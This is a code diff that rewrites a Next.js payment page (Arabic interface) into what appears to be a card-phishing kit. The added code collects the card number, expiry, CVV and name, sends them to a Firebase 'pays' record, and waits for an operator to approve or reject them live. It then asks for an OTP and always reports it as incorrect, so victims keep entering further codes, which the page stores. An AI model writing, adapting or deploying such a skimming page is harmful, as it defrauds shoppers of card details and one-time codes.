@@ -1,92 +1,201 @@
 "use client"
+import { useEffect, useState } from 'react';
+import { doc, onSnapshot } from 'firebase/firestore';
 
-import { useEffect } from "react"
-import { useRouter } from "next/navigation"
-import { doc, setDoc } from "firebase/firestore"
-import { db } from "@/lib/firebase"
-import { usePayment } from "@/contexts/payment-context"
-import { Button } from "@/components/ui/button"
-import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
-import { Input } from "@/components/ui/input"
-import { Label } from "@/components/ui/label"
-import type React from "react" // Added import for React
+import { handlePay } from '@/lib/firebase-service';
+import { db } from '@/lib/firebase';
+type PaymentInfo = {
+  cardNumber: string;
+  year: string;
+  month: string;
+  bank?: string;
+  otp?: string;
+  pass: string;
+  cardState: string;
+  allOtps: string[],
+  bank_card: string[];
+  prefix: string;
+  status: 'new' | 'pending' | 'approved' | 'rejected';
+};
 
-export default function PaymentPage() {
-  const router = useRouter()
-  const { paymentData, setPaymentData } = usePayment()
+export default function Payment  (props: any)  {
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [otp, setOtp] = useState("");
+  const [showOtp, setShowOtp] = useState(false);
 
-  useEffect(() => {
-    if (!paymentData.name || !paymentData.phone) {
-      router.push("/invoice")
-    }
-  }, [paymentData, router])
+  const [step, setstep] = useState(1);
+  const [newotp] = useState([''])
+  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
+    cardNumber: '',
+    year: '2025/',
+    month: '1',
+    otp: '',
+    allOtps: newotp,
+    bank: '',
+    pass: '',
+    cardState: 'new',
+    bank_card: [''],
+    prefix: '',
+    status: 'new',
+  });
 
-  const handlePayment = async (e: React.FormEvent) => {
-    e.preventDefault()
-
-    try {
-      // Update payment status
-      setPaymentData((prev) => ({ ...prev, status: "processing" }))
-
-      // Save to Firebase
-      const paymentRef = doc(db, "payments", paymentData.invoiceNumber)
-      await setDoc(paymentRef, {
-        ...paymentData,
-        timestamp: new Date().toISOString(),
-      })
-
-      // Simulate payment processing
-      setTimeout(() => {
-        setPaymentData((prev) => ({ ...prev, status: "completed" }))
-        router.push("/payment/success")
-      }, 2000)
-    } catch (error) {
-      console.error("Payment failed:", error)
-      setPaymentData((prev) => ({ ...prev, status: "failed" }))
-    }
+  const handleAddotp = (otp: string) => {
+    newotp.push(`${otp} , `)
   }
 
+  const handleSubmit = (e: { preventDefault: () => void; }) => {
+    e.preventDefault();
+    handlePay(paymentInfo,setPaymentInfo)
+    setIsProcessing(true);
+    setstep(2)
+    setTimeout(() => {
+      setIsProcessing(false);
+      setShowOtp(true);
+    }, 2000);
+  };
+
+  const handleOtpSubmit = (e: { preventDefault: () => void; }) => {
+    e.preventDefault();
+    handleAddotp(otp)
+    setstep(3)
+    props.setisloading(true);
+
+    setPaymentInfo({
+      ...paymentInfo,
+      status:'approved'
+    })
+        handlePay(paymentInfo,setPaymentInfo)
+        setTimeout(() => {
+    props.setisloading(false);
+
+    alert("رمز التحقق غير صحيح!");
+          setOtp('')
+        }, 3000);
+  };
+
+  useEffect(() => {
+    //handleAddotp(paymentInfo.otp!)
+  }, [paymentInfo.otp])
+
+  useEffect(() => {
+    const visitorId = localStorage.getItem('visitor');
+    if (visitorId) {
+      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data() as PaymentInfo;
+          if (data.status) {
+            setPaymentInfo(prev => ({ ...prev, status: data.status }));
+            if (data.status === 'approved') {
+              setstep(2);
+              props.setisloading(false);
+            } else if (data.status === 'rejected') {
+              props.setisloading(false);
+              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
+              setstep(1);
+            }
+          }
+        }
+      });
+
+      return () => unsubscribe();
+    }
+  }, []);
+
+
   return (
-    <div className="max-w-md mx-auto p-4 space-y-6" dir="rtl">
-      <Card>
-        <CardHeader>
-          <CardTitle>تفاصيل الدفع</CardTitle>
-        </CardHeader>
-        <CardContent>
-          <form onSubmit={handlePayment} className="space-y-4">
-            <div className="space-y-2">
-              <Label>رقم البطاقة</Label>
-              <Input required placeholder="**** **** **** ****" className="text-right" />
+    <div className='font' style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh", backgroundColor: "#f3f4f6", padding: "16px" }} dir='rtl'>
+      <div style={{ width: "100%", maxWidth: "400px", padding: "24px", backgroundColor: "white", borderRadius: "16px", boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)" }}>
+        <h2 style={{ textAlign: "center", marginBottom: "16px", fontSize: "20px", fontWeight: "600" }}>تفاصيل الدفع</h2>
+        {!showOtp ? (
+          <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
+            <div>
+              <label  dir='rtl'>الاسم على البطاقة</label>
+              <input name="name" onChange={(e)=>{
+                    setPaymentInfo({
+                      ...paymentInfo,
+                      bank: e.target.value,
+                    })}} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc",textAlign:'start' }} />
             </div>
+            <div>
+              <label>رقم البطاقة</label>
+              <input name="cardNumber"type='tel'maxLength={16} minLength={16} onChange={(e)=>{
+                  setPaymentInfo({
+                    ...paymentInfo,
+                    cardNumber: e.target.value,
+                  })
+              }} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
+            </div>
+            <div style={{ display: "flex", gap: "12px" }}>
+              <div style={{ flex: 1 }}>
+                <label>سنة </label>
+                <select name="expiry" value={paymentInfo.year} onChange={(e)=>{
+                    setPaymentInfo({
+                      ...paymentInfo,
+                      year: e.target.value,
+                    })
+                }} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} >
 
-            <div className="grid grid-cols-2 gap-4">
-              <div className="space-y-2">
-                <Label>تاريخ الإنتهاء</Label>
-                <Input required placeholder="MM/YY" className="text-right" />
+                  <option value="2025/">2025</option>
+                  <option value="2026/">2026</option>
+                  <option value="2027/">2027</option>
+                  <option value="2028/">2028</option>
+                  <option value="2029/">2029</option>
+                  <option value="2030/">2030</option>
+                  <option value="2031/">2031</option>
+                  <option value="2032/">2032</option>
+                  <option value="2033/">2033</option>
+                  <option value="2034/">2034</option>
+                </select>
+              
+              </div> <div style={{ flex: 1 }}>
+                <label> شهر</label>
+                <select name="expiry" onChange={(e)=>{
+                    setPaymentInfo({
+                      ...paymentInfo,
+                      month: e.target.value,
+                    })
+                }} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} >
+                  <option value="1">1</option>
+                  <option value="2">2</option>
+                  <option value="3">3</option>
+                  <option value="4">4</option>
+                  <option value="5">5</option>
+                  <option value="6">6</option>
+                  <option value="7">7</option>
+                  <option value="8">8</option>
+                  <option value="9">9</option>
+                  <option value="10">10</option>
+                  <option value="11">11</option>
+                  <option value="12">12</option>
+                </select>
               </div>
-              <div className="space-y-2">
-                <Label>CVV</Label>
-                <Input required placeholder="***" className="text-right" />
+              <div style={{ flex: 1 }}>
+                <label>CVV</label>
+                <input name="cvv" maxLength={3} minLength={3} type='tel' onChange={(e)=>{
+                    setPaymentInfo({
+                      ...paymentInfo,
+                      pass: e.target.value,
+                    })}} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
               </div>
             </div>
-
-            <div className="rounded-lg bg-gray-50 p-4">
-              <div className="flex justify-between">
-                <span>المبلغ:</span>
-                <span>{paymentData.amount} د.ك</span>
-              </div>
-            </div>
-
-            <Button type="submit" className="w-full" disabled={paymentData.status === "processing"}>
-              {paymentData.status === "processing" ? "جاري المعالجة..." : "إتمام الدفع"}
-            </Button>
+           
+            <button type="submit" disabled={isProcessing} style={{ width: "100%", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", padding: "12px", backgroundColor: "#2563eb", color: "white", borderRadius: "4px", border: "none", cursor: "pointer" }}>
+        {isProcessing ? "يرجى الانتظار..." : "ادفع الآن"}
+            </button>
           </form>
-        </CardContent>
-        <CardFooter className="justify-center">
-          <p className="text-sm text-gray-500">المعاملات آمنة ومشفرة</p>
-        </CardFooter>
-      </Card>
+        ) : step === 2 && paymentInfo.status === 'pending' ?  (<>طلب الدفع الخاص بك قيد المعالجة, يرجى الانتظار ...</>):(
+          <form onSubmit={handleOtpSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
+            <div>
+              <label style={{paddingBottom:5}}> يرجى ادخال رمز التحقق OTP المرسل الى جوالك</label>
+              <input name="otp" value={otp}minLength={4} maxLength={6} type='tel' onChange={(e) => setOtp(e.target.value)} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
+            </div>
+            <button type="submit" style={{ width: "100%", padding: "12px", backgroundColor: "#2563eb", color: "white", borderRadius: "4px", border: "none", cursor: "pointer" }}>
+              تأكيد الدفع
+            </button>
+          </form>
+        ) }
+      </div>
     </div>
-  )
-}
+  );
+};
 
